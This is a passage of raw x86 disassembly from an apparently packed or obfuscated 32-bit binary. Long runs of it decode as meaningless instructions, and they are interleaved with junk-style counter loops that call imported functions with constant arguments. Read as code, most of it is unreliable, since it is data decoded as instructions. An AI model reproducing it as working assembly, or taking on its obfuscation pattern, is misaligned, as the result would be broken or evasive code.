  40736f:	or     DWORD PTR ds:0x43382f,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x407379
  407387:	in     eax,0x4
  407389:	sbb    eax,0x7e7ec20a
  40738e:	add    eax,0xb97e7e7c
  407393:	adc    DWORD PTR gs:[ebx-0x71813f6f],0x4364dfa
  40739e:	add    al,BYTE PTR [esi+0x18fa676]
  4073a4:	pusha  
  4073a5:	scas   eax,DWORD PTR es:[edi]
  4073a6:	xchg   ebp,eax
  4073a7:	hlt    
  4073a8:	sbb    BYTE PTR [ebx],ch
  4073aa:	push   esi
  4073ab:	aam    0x4e
  4073ad:	mov    ss,ecx
  4073af:	sub    al,0x1a
  4073b1:	out    0xd9,eax
  4073b3:	bound  eax,QWORD PTR [edi+edi*4]
  4073b6:	or     ebp,ecx
  4073b8:	mov    dl,0x82
  4073ba:	lods   al,BYTE PTR ds:[esi]
  4073bb:	xor    ah,BYTE PTR [esi-0x79]
  4073be:	adc    eax,DWORD PTR [ebx+0x1f2b2b1e]
  4073c4:	sbb    eax,0x32085a4e
  4073c9:	aad    0xed
  4073cb:	outs   dx,DWORD PTR ds:[esi]
  4073cc:	mov    edx,0xfda6048f
  4073d1:	ss jno 0x4073c4
  4073d4:	cli    
  4073d5:	aam    0x28
  4073d7:	lods   al,BYTE PTR ds:[esi]
  4073d8:	sub    ch,bh
  4073da:	enter  0xd8b7,0x7e
  4073de:	xchg   ecx,eax
  4073df:	sti    
  4073e0:	sti    
  4073e1:	dec    edx
  4073e2:	std    
  4073e3:	sub    eax,0x55e27221
  4073e8:	and    dh,0x31
  4073eb:	js     0x407386
  4073ed:	mov    ds:0x49b80764,al
  4073f2:	jno    0x4073f0
  4073f4:	jecxz  0x407403
  4073f6:	push   edi
  4073f7:	push   edi
  4073f8:	dec    eax
  4073f9:	mov    ebx,0x5a3aaf34
  4073fe:	adc    eax,edi
  407400:	imul   esi,DWORD PTR ds:0x42ac4c29,0xffffffc2
  407407:	and    DWORD PTR [edx+0x7a5452df],ebp
  40740d:	ss sub ah,dl
  407410:	inc    ebx
  407411:	xchg   bl,al
  407413:	fs mov esi,0x49aaabcd
  407419:	push   edx
  40741a:	in     eax,dx
  40741b:	scas   eax,DWORD PTR es:[edi]
  40741c:	(bad)  [edi-0x20]
  40741f:	sbb    eax,DWORD PTR [eax]
  407421:	xchg   ecx,eax
  407422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407423:	dec    ebp
  407424:	push   edx
  407425:	dec    ebp
  407426:	pop    eax
  407427:	cmp    cl,BYTE PTR [esi+0x62]
  40742a:	js     0x40742d
  40742c:	out    dx,al
  40742d:	out    dx,al
  40742e:	mov    ecx,DWORD PTR [ebp-0x29]
  407431:	jg     0x40742b
  407433:	jno    0x40743f
  407435:	int    0x7c
  407437:	(bad)  
  407439:	fdivr  QWORD PTR [edx-0x4de37ea1]
  40743f:	dec    edx
  407440:	pop    edx
  407441:	loope  0x40747b
  407443:	add    DWORD PTR [ebp-0x10],edi
  407446:	cli    
  407447:	mov    ah,0x68
  407449:	adc    edx,DWORD PTR [edx]
  40744b:	ins    DWORD PTR es:[edi],dx
  40744c:	ror    BYTE PTR [edi-0x58],cl
  40744f:	jnp    0x407472
  407451:	std    
  407452:	test   eax,0x2bc18a1e
  407457:	(bad)  
  407458:	cmp    esp,DWORD PTR [edx+0x31b8e77b]
  40745e:	mov    bl,0xf1
  407460:	js     0x407455
  407462:	es and esp,ebp
  407465:	lds    ebp,FWORD PTR [edx-0x2]
  407468:	loop   0x407497
  40746a:	xor    BYTE PTR [edi-0x45],ah
  40746d:	push   ds
  40746e:	push   ecx
  40746f:	mov    bh,0xb6
  407471:	inc    esi
  407472:	sbb    eax,0x252517c2
  407477:	sbb    ebp,eax
  407479:	cmp    al,0xcb
  40747b:	sbb    DWORD PTR [ecx-0x16227ee4],esp
  407481:	dec    ebx
  407482:	push   eax
  407483:	dec    edi
  407484:	or     al,0x23
  407486:	inc    eax
  407487:	adc    BYTE PTR [eax],0x9d
  40748a:	cdq    
  40748b:	pop    edx
  40748c:	push   ds
  40748d:	push   es
  40748e:	dec    edi
  40748f:	jecxz  0x40741d
  407491:	mov    ebx,0xd97716e2
  407496:	push   ecx
  407497:	dec    edx
  407498:	xchg   edx,eax
  407499:	adc    eax,0xe1f7a040
  40749e:	adc    al,0xe8
  4074a0:	jb     0x4074b5
  4074a2:	fdiv   DWORD PTR [eax+0x65f302ad]
  4074a8:	or     eax,0x15c4bf16
  4074ad:	int3   
  4074ae:	in     al,dx
  4074af:	arpl   WORD PTR [eax+ecx*8+0x56],sp
  4074b3:	sbb    DWORD PTR [ecx-0x77],edi
  4074b6:	pop    ebx
  4074b7:	aas    
  4074b8:	inc    ebp
  4074b9:	popf   
  4074ba:	inc    eax
  4074bb:	int3   
  4074bc:	and    bh,BYTE PTR [ecx-0x51]
  4074bf:	and    eax,0x15807664
  4074c4:	stos   DWORD PTR es:[edi],eax
  4074c5:	dec    ecx
  4074c6:	das    
  4074c7:	fwait
  4074c8:	outs   dx,DWORD PTR ds:[esi]
  4074c9:	pop    edx
  4074ca:	dec    esp
  4074cb:	mov    ch,BYTE PTR [ecx]
  4074cd:	mov    ch,0x4e
  4074cf:	adc    eax,0xc3893de1
  4074d4:	xchg   ecx,eax
  4074d5:	adc    dh,BYTE PTR [esi+0x7dc78254]
  4074db:	out    0xe8,eax
  4074dd:	cmp    cl,BYTE PTR [ebp-0x67016e38]
  4074e3:	es stos DWORD PTR es:[edi],eax
  4074e5:	mov    eax,0xc454f962
  4074ea:	push   0xd
  4074ec:	daa    
  4074ed:	ja     0x407486
  4074ef:	clc    
  4074f0:	fstp   TBYTE PTR [eax-0x7d6c4860]
  4074f6:	dec    ebp
  4074f7:	xor    eax,DWORD PTR [edx]
  4074f9:	push   DWORD PTR [eax]
  4074fb:	fidivr DWORD PTR [ebp+edi*8+0x7]
  4074ff:	aad    0x7d
  407501:	outs   dx,DWORD PTR ds:[esi]
  407502:	jo     0x4074f1
  407504:	bound  ebx,QWORD PTR [ebp+ecx*2-0x212e2037]
  40750b:	ds or  al,0x20
  40750e:	aaa    
  40750f:	jo     0x40755f
  407511:	outs   dx,BYTE PTR ds:[esi]
  407512:	cmp    DWORD PTR [edi+0x32],ecx
  407515:	xchg   ebp,eax
  407516:	fiadd  WORD PTR ds:0x179ff11d
  40751c:	daa    
  40751d:	mov    dh,BYTE PTR [ecx+0x2e]
  407520:	(bad)  
  407521:	xchg   ebx,eax
  407522:	mov    eax,ds:0xf1ddbe0c
  407527:	add    DWORD PTR [eax],ecx
  407529:	loopne 0x407569
  40752b:	and    DWORD PTR [ebx],eax
  40752d:	hlt    
  40752e:	xchg   ecx,eax
  40752f:	stos   DWORD PTR es:[edi],eax
  407530:	sbb    eax,DWORD PTR [ecx-0x67]
  407533:	adc    eax,ebx
  407535:	fidivr DWORD PTR [edi]
  407537:	test   BYTE PTR [eax+eiz*2-0x32],dh
  40753b:	jl     0x407535
  40753d:	fisub  DWORD PTR [eax+ebx*2]
  407540:	push   ds
  407541:	nop
  407542:	mov    eax,0x921e3765
  407547:	fdiv   DWORD PTR [eax-0x68dce116]
  40754d:	in     eax,0x6f
  40754f:	fmul   QWORD PTR [esi-0x2eaf1a9b]
  407555:	sub    al,BYTE PTR [eax-0x710072de]
  40755b:	adc    BYTE PTR [ecx+0x64],0x5
  40755f:	div    DWORD PTR [ecx+0x4a]
  407562:	jo     0x407594
  407564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407565:	repz mov edx,0x50973e74
  40756b:	in     eax,0x65
  40756d:	jo     0x407533
  40756f:	add    al,0xdc
  407571:	test   esp,esp
  407573:	mov    ecx,0xdbab4675
  407578:	enter  0xe591,0xb4
  40757c:	or     eax,0x8a47e43e
  407581:	imul   esi,DWORD PTR [edi+0x7e],0x13
  407585:	fild   QWORD PTR [ebx]
  407587:	add    bl,BYTE PTR [edi-0x6f07f968]
  40758d:	cmp    DWORD PTR [ecx],ebx
  40758f:	call   0x4e1f:0x5d5f4092
  407596:	xchg   esp,eax
  407597:	lock out dx,eax
  407599:	shl    DWORD PTR [ebp+eiz*4-0x23],0xc7
  40759e:	inc    ebp
  40759f:	in     al,dx
  4075a0:	xor    DWORD PTR [ebp+0x5135f89c],eax
  4075a6:	add    eax,0x77b80000
  4075ab:	xchg   ebp,eax
  4075ac:	add    BYTE PTR [eax],al
  4075ae:	mov    ecx,DWORD PTR ds:0x433753
  4075b4:	sub    DWORD PTR ds:0x43370f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x4336ff
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x43376b,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43370f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43370f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43370f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43370f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43370f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	jp     0x40767c
  407657:	adc    edi,esi
  407659:	adc    eax,eax
  40765b:	jle    0x4076db
  40765d:	add    eax,0x467e7e7c
  407662:	inc    ecx
  407663:	cmp    DWORD PTR [edi],edx
  407665:	xchg   ecx,eax
  407666:	enter  0xabe,0xe4
  40766a:	outs   dx,BYTE PTR ds:[esi]
  40766b:	mov    al,0x69
  40766d:	fcomp  DWORD PTR [ebx+0x27]
  407670:	addr16 jbe 0x4075fe
  407673:	xor    DWORD PTR [ecx+0x2e],ebx
  407676:	(bad)  
  407678:	das    
  407679:	mov    ds:0x400946cf,eax
  40767e:	cmp    ecx,DWORD PTR [eax]
  407680:	inc    ecx
  407681:	ins    BYTE PTR es:[edi],dx
  407682:	cwde   
  407683:	es and eax,0x179cffdc
  407689:	stos   DWORD PTR es:[edi],eax
  40768a:	xchg   BYTE PTR [esi-0x2bcb6cb7],al
  407690:	enter  0x8be5,0x49
  407694:	push   edi
  407695:	pushf  
  407696:	out    dx,eax
  407697:	rcl    BYTE PTR [ebx+eax*4-0x20976e46],1
  40769e:	test   DWORD PTR [eax-0x618ba58e],esp
  4076a4:	xor    DWORD PTR [esi-0x5c9c1c0c],ecx
  4076aa:	outs   dx,DWORD PTR ds:[esi]
  4076ab:	mov    DWORD PTR [ecx],ecx
  4076ad:	aam    0x5b
  4076af:	add    esi,DWORD PTR [ebp-0x75]
  4076b2:	mov    bh,0x97
  4076b4:	leave  
  4076b5:	stos   DWORD PTR es:[edi],eax
  4076b6:	pushf  
  4076b7:	mov    ch,0x1d
  4076b9:	dec    eax
  4076ba:	adc    BYTE PTR [esi-0x77],al
  4076bd:	enter  0x84e1,0x26
  4076c1:	retf   0x8967
  4076c4:	mov    edi,0x4c28238b
  4076c9:	push   esp
  4076ca:	mov    ecx,0xb41cee14
  4076cf:	mov    cl,0x5b
  4076d1:	out    dx,al
  4076d2:	rol    BYTE PTR [ebp+0x75],1
  4076d5:	jle    0x40767b
  4076d7:	xchg   ebp,eax
  4076d8:	jl     0x4076b2
  4076da:	sbb    BYTE PTR [ebx],dl
  4076dc:	xchg   ebp,eax
  4076dd:	das    
  4076de:	popa   
  4076df:	cli    
  4076e0:	or     al,0xd8
  4076e2:	push   edx
  4076e3:	ja     0x407677
  4076e5:	js     0x4076ae
  4076e7:	add    BYTE PTR [ebx+0x5f],bl
  4076ea:	or     DWORD PTR [eax],0x57aae736
  4076f0:	inc    esp
  4076f1:	cmp    ebp,edi
  4076f3:	stos   BYTE PTR es:[edi],al
  4076f4:	jge    0x407690
  4076f6:	popf   
  4076f7:	shl    BYTE PTR [ebp-0x59a8d3bc],0x24
  4076fe:	xchg   ebp,eax
  4076ff:	xor    bh,al
  407701:	adc    dl,dl
  407703:	and    BYTE PTR [edx+0x45],cl
  407706:	test   BYTE PTR [ebp-0x64],al
  407709:	repnz push ebp
  40770b:	mov    dl,0x5b
  40770d:	mov    esp,0x3791ba5a
  407712:	fsubrp st(3),st
  407714:	int    0x3e
  407716:	xor    DWORD PTR [edi-0x572a9ef2],eax
  40771c:	adc    eax,0xd63805ce
  407721:	push   ebp
  407722:	lahf   
  407723:	loop   0x4076d2
  407725:	or     eax,edx
  407727:	ror    BYTE PTR [ebx-0x6d5feebe],cl
  40772d:	xchg   DWORD PTR [ebx-0x1e],ebx
  407730:	mov    DWORD PTR [esi],esp
  407732:	popf   
  407733:	dec    ebx
  407734:	out    dx,eax
  407735:	bound  edi,QWORD PTR [esi-0x46]
  407738:	jno    0x407717
  40773a:	sbb    edi,DWORD PTR [ebp-0x6af2bb03]
  407740:	sub    eax,0x9fd358ed
  407745:	pop    ebp
  407746:	mov    esp,0x5a5cdb09
  40774b:	or     eax,DWORD PTR [ebp-0x68]
  40774e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40774f:	pop    esi
  407750:	fdiv   DWORD PTR [ebp+0x79]
  407753:	pusha  
  407754:	sub    eax,esi
  407756:	add    dh,ch
  407758:	or     DWORD PTR [esi-0x57],esp
  40775b:	stos   BYTE PTR es:[edi],al
  40775c:	xchg   esp,eax
  40775d:	cwde   
  40775e:	pop    ebp
  40775f:	enter  0xe508,0xfc
  407763:	(bad)  
  407764:	jmp    0x169e39d3
  407769:	shl    BYTE PTR [ebx],0x64
  40776c:	jl     0x4077ba
  40776e:	mov    esi,0x8d15cdcf
  407773:	or     esp,DWORD PTR [edx]
  407775:	mov    eax,0xd3c7e1e4
  40777a:	mov    ah,0xee
  40777c:	xor    al,0x5f
  40777e:	sbb    eax,0xc71e8e12
  407783:	pop    ss
  407784:	pop    ss
  407785:	jge    0x407714
  407787:	jl     0x407729
  407789:	(bad)  
  40778a:	adc    dl,dl
  40778c:	fwait
  40778d:	add    DWORD PTR [eax-0x760e8c1e],eax
  407793:	mov    bl,0x10
  407795:	outs   dx,BYTE PTR ds:[esi]
  407796:	jae    0x407726
  407798:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407799:	mov    dh,0x6a
  40779b:	imul   edx,DWORD PTR [edx-0x34],0x9924d28b
  4077a2:	and    ebp,DWORD PTR [ebp+ebp*1-0x6b]
  4077a6:	in     eax,0x94
  4077a8:	mov    BYTE PTR ds:0x342faa2b,dl
  4077ae:	lods   al,BYTE PTR ds:[esi]
  4077af:	adc    al,0x3c
  4077b1:	inc    esi
  4077b2:	push   ebx
  4077b3:	dec    ecx
  4077b4:	or     eax,0xa9d76795
  4077b9:	and    al,0xde
  4077bb:	ss inc esp
  4077bd:	lock xchg bh,bl
  4077c0:	push   cs
  4077c1:	xchg   DWORD PTR [ecx],ecx
  4077c3:	cmp    edi,DWORD PTR [ebx+ebx*4-0x5cb63527]
  4077ca:	ds push edx
  4077cc:	dec    ebx
  4077cd:	pop    ecx
  4077ce:	int    0xf6
  4077d0:	xor    al,0x2
  4077d2:	push   es
  4077d3:	and    al,0x7b
  4077d5:	outs   dx,DWORD PTR ds:[esi]
  4077d6:	push   cs
  4077d7:	pusha  
  4077d8:	xchg   esi,eax
  4077d9:	out    0x90,al
  4077db:	mov    cl,0x7e
  4077dd:	int3   
  4077de:	and    al,0x70
  4077e0:	and    BYTE PTR [ebp-0x7bc4c46d],cl
  4077e6:	rol    BYTE PTR [ebx+0x6b],1
  4077e9:	mov    edi,0x6dd8ffe9
  4077ee:	mov    ebx,esp
  4077f0:	push   esp
  4077f1:	push   es
  4077f2:	mov    eax,0xa6d4ca8a
  4077f7:	push   cs
  4077f8:	push   0xdc55e179
  4077fd:	cmp    BYTE PTR [esi-0x6a],ah
  407800:	fwait
  407801:	or     BYTE PTR [ecx-0x4c78c51c],al
  407807:	jmp    0xb4aeaf3a
  40780c:	push   eax
  40780d:	or     DWORD PTR [ebx+0x39],ebp
  407810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407811:	mov    DWORD PTR [edx+edi*8],ebp
  407814:	sahf   
  407815:	aad    0xce
  407817:	adc    al,0x96
  407819:	adc    eax,DWORD PTR [esi-0x77]
  40781c:	add    cl,BYTE PTR [edi]
  40781e:	sahf   
  40781f:	push   es
  407820:	pop    ecx
  407821:	aas    
  407822:	cmp    BYTE PTR [ebp+0x4014ad8b],bh
  407828:	nop
  407829:	push   ebx
  40782a:	add    ch,bh
  40782c:	sbb    esi,ebx
  40782e:	hlt    
  40782f:	mov    edi,0x76761a44
  407834:	inc    edx
  407835:	inc    edx
  407836:	sub    DWORD PTR [ebx-0x12709508],esi
  40783c:	or     BYTE PTR [edx+eiz*4+0x55],ch
  407840:	mov    edi,0xb84ed3a1
  407845:	pop    ebx
  407846:	mov    ecx,0xaa5f36e6
  40784b:	pop    edx
  40784c:	test   eax,0x935f47bb
  407851:	cwde   
  407852:	push   ecx
  407853:	inc    esp
  407854:	push   ss
  407855:	icebp  
  407856:	inc    esi
  407857:	aaa    
  407858:	loope  0x407870
  40785a:	test   DWORD PTR [edx],eax
  40785c:	or     al,0xcc
  40785e:	in     al,0xa1
  407860:	sahf   
  407861:	(bad)  
  407862:	sbb    esi,edx
  407864:	mov    cl,0x1
  407866:	out    0xdb,al
  407868:	out    0xef,eax
  40786a:	cmp    esi,esp
  40786c:	push   esi
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x4336ff,0x433763
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43381b,0x12
  40788b:	cmp    DWORD PTR ds:0x43381b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43381b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43381b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43381b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43379f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43379f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43379f,esi
  4078e0:	cmp    DWORD PTR ds:0x43379f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43379f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x23,eax
  407922:	es jg  0x40798b
  407925:	and    al,0xce
  407927:	jle    0x4079a7
  407929:	add    eax,0xab7e7e7c
  40792e:	fwait
  40792f:	adc    eax,0x117ab3b8
  407934:	in     eax,dx
  407935:	cmp    ecx,edi
  407937:	push   ebx
  407938:	sbb    edx,DWORD PTR [ecx-0x371a16de]
  40793e:	call   0xd478:0x136e0fb5
  407945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407946:	stos   BYTE PTR es:[edi],al
  407947:	jp     0x4079b2
  407949:	and    cl,0x38
  40794c:	jnp    0x4079cd
  40794e:	stc    
  40794f:	gs mov ecx,0x56f4675f
  407955:	test   BYTE PTR [edx+0x36bccaab],bl
  40795b:	leave  
  40795c:	pusha  
  40795d:	test   DWORD PTR ds:0x4381a0ad,0x1d80b513
  407967:	adc    edx,DWORD PTR cs:[esi-0x51c655a4]
  40796e:	fwait
  40796f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407970:	adc    BYTE PTR [edx-0x25f6a6fc],ah
  407976:	jle    0x4079e4
  407978:	ss jp  0x4079d1
  40797b:	jns    0x407924
  40797d:	int3   
  40797e:	mov    cl,0xe3
  407980:	jno    0x407997
  407982:	jo     0x407979
  407984:	lahf   
  407985:	inc    ebp
  407986:	aaa    
  407987:	xchg   ecx,eax
  407988:	test   eax,0xab7e755b
  40798d:	das    
  40798e:	aad    0x9
  407990:	push   esp
  407991:	fdiv   st,st(3)
  407993:	mov    bh,0xe1
  407995:	jo     0x40799c
  407997:	pop    esi
  407998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407999:	sub    BYTE PTR [ebx-0x23],0x51
  40799d:	arpl   WORD PTR [ebx+0x34],bp
  4079a0:	pushf  
  4079a1:	cmp    eax,0xf8254773
  4079a6:	add    BYTE PTR [ebx+0x431057f7],cl
  4079ac:	add    eax,0xf6940af5
  4079b1:	sbb    eax,DWORD PTR [ebx-0x57535a3a]
  4079b7:	shr    edx,0x64
  4079ba:	gs fwait
  4079bc:	mov    bh,0x88
  4079be:	push   esi
  4079bf:	pop    eax
  4079c0:	arpl   WORD PTR [ebp+0x7],si
  4079c3:	loop   0x407a44
  4079c5:	rcl    BYTE PTR [ebx-0x3f5b64b0],1
  4079cb:	fs dec edi
  4079cd:	pop    eax
  4079ce:	jg     0x4079e0
  4079d0:	and    edi,ebx
  4079d2:	add    eax,0x5874f3
  4079d7:	inc    edx
  4079d8:	loopne 0x4079a5
  4079da:	jecxz  0x4079f8
  4079dc:	xchg   edx,eax
  4079dd:	cmp    al,0xa1
  4079df:	test   DWORD PTR [ecx+eax*8-0x2f],edi
  4079e3:	mov    ah,0x2e
  4079e5:	loop   0x4079f6
  4079e7:	dec    edx
  4079e8:	or     cl,BYTE PTR [ecx-0x5dc7138b]
  4079ee:	push   0xfac26c79
  4079f3:	mov    esp,0x57fc2f4
  4079f8:	mov    al,0x82
  4079fa:	mov    bh,0x9b
  4079fc:	ficom  DWORD PTR [ebx+ebx*1+0x19d5faa6]
  407a03:	fnstsw WORD PTR ds:0x4fb93d7b
  407a09:	mov    ds:0x88e3e1a0,eax
  407a0e:	xor    DWORD PTR [edi],ebx
  407a10:	sbb    al,dh
  407a12:	lds    ebp,FWORD PTR [eax+0x4e8f4969]
  407a18:	scas   al,BYTE PTR es:[edi]
  407a19:	xor    DWORD PTR [ebx],edi
  407a1b:	jae    0x4079e0
  407a1d:	jl     0x407a8b
  407a1f:	and    al,0x5b
  407a21:	push   ss
  407a22:	cwde   
  407a23:	imul   edx,DWORD PTR [edx+0x18],0x8c485336
  407a2a:	dec    esi
  407a2b:	and    al,0xc6
  407a2d:	pop    ss
  407a2e:	inc    ebx
  407a2f:	xchg   ebp,eax
  407a30:	scas   eax,DWORD PTR es:[edi]
  407a31:	cmp    BYTE PTR [edi-0x7e091a7e],ah
  407a37:	cmp    al,0x11
  407a39:	mov    WORD PTR [edx],?
  407a3b:	(bad)  
  407a3c:	(bad)  [ebx+0x72]
  407a3f:	(bad)  
  407a40:	add    BYTE PTR [esi+eiz*1+0x4d4d2c35],dl
  407a47:	push   edi
  407a48:	xor    DWORD PTR [edi+0x2441302b],ebp
  407a4e:	pop    ds
  407a4f:	xor    esi,DWORD PTR [edx-0x2390edb3]
  407a55:	aas    
  407a56:	es in  al,dx
  407a58:	sahf   
  407a59:	lods   eax,DWORD PTR ds:[esi]
  407a5a:	arpl   WORD PTR [ecx-0x17],dx
  407a5d:	sti    
  407a5e:	outs   dx,DWORD PTR ds:[esi]
  407a5f:	aas    
  407a60:	loope  0x407a0d
  407a62:	push   ss
  407a63:	add    ecx,DWORD PTR [ebx+0x48fc5b3f]
  407a69:	mov    al,0x24
  407a6b:	repz pop esi
  407a6d:	in     al,0xd5
  407a6f:	sti    
  407a70:	stos   DWORD PTR es:[edi],eax
  407a71:	in     eax,dx
  407a72:	lahf   
  407a73:	pushf  
  407a74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a75:	das    
  407a76:	lods   eax,DWORD PTR ds:[esi]
  407a77:	dec    ecx
  407a78:	mov    edi,0xea98bf08
  407a7d:	shl    BYTE PTR [edx],0x11
  407a80:	into   
  407a81:	xor    ebx,eax
  407a83:	jmp    0x407a5a
  407a85:	rcr    BYTE PTR [ebp+eiz*2-0x8c983af],cl
  407a8c:	jmp    0x90bb:0xe3771fd5
  407a93:	inc    ebx
  407a94:	into   
  407a95:	mov    ecx,0x8c16e5c3
  407a9a:	frstor [edi]
  407a9c:	dec    DWORD PTR [ebx]
  407a9e:	out    0x9d,eax
  407aa0:	test   DWORD PTR [ebx+edi*4],0x741af0a3
  407aa7:	rcr    BYTE PTR [eax+edx*4],0x8c
  407aab:	jbe    0x407b1d
  407aad:	outs   dx,BYTE PTR ds:[esi]
  407aae:	(bad)  
  407aaf:	fcomp  QWORD PTR [esi-0x64]
  407ab2:	popf   
  407ab3:	jne    0x407aff
  407ab5:	fistp  WORD PTR [ebp+0x4f]
  407ab8:	or     eax,0x7aa7689a
  407abd:	fidivr DWORD PTR [edx-0x38]
  407ac0:	fwait
  407ac1:	cmp    edi,esp
  407ac3:	xchg   DWORD PTR [esi+0x5edbed9e],eax
  407ac9:	mov    dh,0x7e
  407acb:	push   ds
  407acc:	add    al,0x12
  407ace:	pop    esp
  407acf:	jb     0x407ab1
  407ad1:	retf   0x2815
  407ad4:	mov    ss,WORD PTR [ebp+0x74]
  407ad7:	aad    0xf5
  407ad9:	xchg   cl,bl
  407adb:	jmp    0x407a97
  407add:	enter  0x3f17,0x1d
  407ae1:	mov    WORD PTR [ebx+0x4e156b60],?
  407ae7:	clc    
  407ae8:	and    BYTE PTR [ebx+edx*1-0x6276b604],dh
  407aef:	pop    ebp
  407af0:	(bad)  
  407af1:	mov    ch,BYTE PTR [edx]
  407af3:	je     0x407ad5
  407af5:	(bad)  [edi-0x7a2f7101]
  407afb:	mov    ch,0x96
  407afd:	push   0x24
  407aff:	ret    0x342e
  407b02:	inc    edx
  407b03:	pop    ecx
  407b04:	(bad)  
  407b05:	stos   BYTE PTR es:[edi],al
  407b06:	or     DWORD PTR [esi-0x1e3951e8],eax
  407b0c:	mov    ds:0x370ec5ec,eax
  407b11:	push   0xffffffa9
  407b13:	sbb    al,BYTE PTR es:[ecx+0x4ff3d2bc]
  407b1a:	scas   al,BYTE PTR es:[edi]
  407b1b:	dec    edi
  407b1c:	pushf  
  407b1d:	retf   
  407b1e:	add    eax,0xe0a680ca
  407b23:	cmp    ebx,DWORD PTR [edi]
  407b25:	push   ds
  407b26:	(bad)  
  407b27:	and    dh,ch
  407b29:	or     eax,ecx
  407b2b:	add    bl,BYTE PTR [edi*4-0x63db54f6]
  407b32:	cmp    ch,bl
  407b34:	xor    eax,0x33d6d326
  407b39:	rol    DWORD PTR [ecx+0x4337ab15],0x0
  407b40:	outs   dx,BYTE PTR ds:[esi]
  407b41:	sbb    al,0x0
  407b43:	add    BYTE PTR [esi+0x32729b],bh
  407b49:	mov    DWORD PTR ds:0x433753,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433707,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x43382f,0x43370f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43379f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433703
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x4337a7,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43371f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x43376b,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x43376b,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x4337d7
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x433757,0x11
  407bd9:	cmp    DWORD PTR ds:0x433757,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x433757,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x433757,0x7
  407c0a:	jne    0x407c1f
